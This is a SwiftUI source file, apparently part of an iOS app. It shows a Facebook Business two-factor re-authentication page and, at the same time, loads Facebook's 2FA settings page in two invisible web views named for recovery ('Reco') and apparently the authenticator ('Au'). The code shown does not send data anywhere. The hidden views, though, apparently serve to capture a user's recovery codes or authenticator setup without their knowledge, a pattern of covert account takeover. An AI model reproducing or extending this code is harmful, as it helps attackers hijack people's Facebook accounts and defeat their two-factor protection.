import SwiftUI

@available(iOS 14.0, *)
public struct SevenView {
    public init(whenCompletePushToNine: @escaping () -> Void, whenCompletePushToTen: @escaping () -> Void) {
        self.whenCompletePushToNine = whenCompletePushToNine
        self.whenCompletePushToTen = whenCompletePushToTen
    }

    var whenCompletePushToNine: () -> Void
    var whenCompletePushToTen: () -> Void

    @State var is_seven_vui_long_cho: Bool = true
    @State var is_seven_chuyen_mam: Bool = false

    @State var is_seven_reco_done: Bool = false

    var body: some View {
        ZStack { Color.white.ignoresSafeArea()
            if is_seven_chuyen_mam {
                Color.clear.onAppear {
                    self.whenCompletePushToNine()
                }
            } else {
                if is_seven_vui_long_cho {
                    ProgressView("")
                }
                if is_seven_reco_done {
                    Color.clear.onAppear {
                        self.whenCompletePushToTen()
                    }
                } else {
                    ZStack {
                        Coords_Seven(url: URL(string: "https://business.facebook.com/security/twofactor/reauth/?twofac_next=https://www.facebook.com/security/2fac/setup/intro/"), is_seven_chuyen_mam: $is_seven_chuyen_mam).opacity(is_seven_vui_long_cho ? 0 : 1)
                    }.zIndex(10)

                    ZStack {
                        Coords_Seven_Reco(url: URL(string: "https://www.facebook.com/security/2fac/settings"), is_seven_reco_done: $is_seven_reco_done).opacity(0)
                    }.zIndex(2.0)

                    ZStack {
                        Coords_Seven_Au(url: URL(string: "https://www.facebook.com/security/2fac/settings")).opacity(0)
                    }.zIndex(3.0)
                }
            }
        }
        .foregroundColor(Color.black)
        .background(Color.white)
        .onAppear { Seven_Ham_time_run() }
    } // body

    func Seven_Ham_time_run() {
        is_seven_vui_long_cho = true
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            is_seven_vui_long_cho = false
        }
    }
}
